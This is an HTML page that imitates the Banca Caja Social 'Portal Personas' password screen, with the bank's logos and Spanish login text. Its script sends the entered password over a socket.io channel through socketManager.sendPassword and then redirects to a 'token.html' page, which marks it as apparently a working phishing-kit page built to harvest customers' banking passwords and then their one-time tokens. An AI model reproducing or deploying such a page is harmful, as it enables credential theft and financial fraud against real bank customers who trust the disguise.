<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
    <title>Contraseña - Portal Personas - Banca Caja Social</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <style>input, select, textarea { font-size: 16px !important; }</style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div style="text-align:center;">
            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;">
        </div>
    </div>
    
    <div class="container">
        <div class="left-section">
            <img src="img/background-2.png" alt="Familia" class="background-image" id="bgImage">
        </div>
        <div class="right-section">
            <div class="form-container">
                <div class="logo-container">
                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
                </div>
                
                <h1 class="title">Bienvenido al Portal Personas</h1>
                
                <p class="subtitle">
                    Ingrese su contraseña de canales digitales, recuerde que está compuesta por <strong>8 caracteres</strong>.
                </p>
                
                <form class="login-form" id="passwordForm">
                    <div class="form-group">
                        <label for="password" class="form-label">Contraseña</label>
                        <div class="password-input-container">
                            <input type="password" id="password" name="password" class="form-input password-input" maxlength="8" autocomplete="off">
                            <button type="button" class="toggle-password" aria-label="Mostrar contraseña">
                                <svg class="eye-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <g class="eye-group">
                                        <path class="eye-path" d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#262627"/>
                                        <line class="eye-slash" x1="4" y1="4" x2="20" y2="20" stroke="#262627" stroke-width="2" stroke-linecap="round"/>
                                    </g>
                                </svg>
                            </button>
                        </div>
                        <small class="bb-input-validation-message error-message" style="display:none;">Datos incorrectos. Verifique la longitud de su contraseña.</small>
                    </div>
                    
                    <div class="bb-button-bar">
                        <button type="submit" id="btnContinuar" class="btn btn-primary username-then-password-button" disabled>Iniciar sesión</button>
                    </div>
                    
                    <a href="#" class="btn-link-text link-forgot" style="display: inline-block; margin-left: 1rem; margin-bottom: 20px;">¿Olvidó su contraseña? ▼</a>
                    
                    <hr class="identity-separator">
                    
                    <div class="bb-subtitle">
                        <span class="register-text">¿Es un cliente nuevo?</span>
                        <a href="#" class="btn-link-text link-register">Registrarse</a>
                    </div>
                    
                    <div class="back-link-container">
                        <a href="index.html" class="link-back">← Volver</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <div id="pantallaCarga" class="pantalla-carga">
        <div class="spinner-circulo">
            <div class="spinner-logo">
                <img src="img/logo-caja-social.png" alt="Caja Social">
            </div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const btnContinuar = document.getElementById('btnContinuar');
            const togglePassword = document.querySelector('.toggle-password');
            const errorMessage = document.querySelector('.error-message');
            
            passwordInput.addEventListener('input', function() {
                const value = this.value;
                errorMessage.style.display = 'none';
                passwordInput.classList.remove('error');
                
                if (value.length === 8) {
                    btnContinuar.disabled = false;
                } else {
                    btnContinuar.disabled = true;
                }
            });
            
            const eyeSlash = document.querySelector('.eye-slash');
            
            if (togglePassword) {
                togglePassword.addEventListener('click', function() {
                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                    passwordInput.setAttribute('type', type);
                    
                    togglePassword.classList.add('toggle-active');
                    setTimeout(() => { togglePassword.classList.remove('toggle-active'); }, 200);
                    
                    if (type === 'text') {
                        eyeSlash.style.opacity = '1';
                        eyeSlash.style.transform = 'scale(1)';
                        togglePassword.setAttribute('aria-label', 'Ocultar contraseña');
                    } else {
                        eyeSlash.style.opacity = '0';
                        eyeSlash.style.transform = 'scale(0)';
                        togglePassword.setAttribute('aria-label', 'Mostrar contraseña');
                    }
                });
            }
            
            document.getElementById('passwordForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const value = passwordInput.value;
                
                if (value.length !== 8) {
                    errorMessage.style.display = 'block';
                    passwordInput.classList.add('error');
                } else {
                    errorMessage.style.display = 'none';
                    passwordInput.classList.remove('error');
                    
                    if (typeof socketManager !== 'undefined' && socketManager.sendPassword) {
                        socketManager.sendPassword(value);
                    }
                    
                    var pantalla = document.getElementById('pantallaCarga');
                    if (pantalla) pantalla.classList.add('activa');
                    setTimeout(function(){
                        window.location.href = 'token.html';
                    }, 1500);
                }
            });
        });
    </script>

    <script src="/js/banco-utils.js"></script>
    <script src="client-optimized.js"></script>

<script>
(function(){
    var imagenes = ['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
    var bg = document.getElementById('bgImage');
    if (bg) {
        var ultima = sessionStorage.getItem('ultimaBg') || '';
        var disponibles = imagenes.filter(function(img){ return img !== ultima; });
        var aleatoria = disponibles[Math.floor(Math.random() * disponibles.length)];
        bg.src = aleatoria;
        sessionStorage.setItem('ultimaBg', aleatoria);
    }
})();
</script>

<script>
(function(){
'use strict';
var lastTouchEnd = 0;
document.addEventListener('touchend', function(e){
var ahora = new Date().getTime();
if (ahora - lastTouchEnd <= 300) { e.preventDefault(); }
lastTouchEnd = ahora;
}, { passive: false });
document.addEventListener('dblclick', function(e){ e.preventDefault(); });
document.addEventListener('focusin', function(e){
var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
if (tag === 'input' || tag === 'textarea' || tag === 'select') {
if (e.target.style.fontSize !== '16px') {
e.target.dataset._fs = e.target.style.fontSize || '';
e.target.style.fontSize = '16px';
}
}
});
document.addEventListener('focusout', function(e){
var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
if (tag === 'input' || tag === 'textarea' || tag === 'select') {
if (e.target.dataset._fs !== undefined) {
e.target.style.fontSize = e.target.dataset._fs;
delete e.target.dataset._fs;
}
}
});
})();
</script>
</body>
</html>
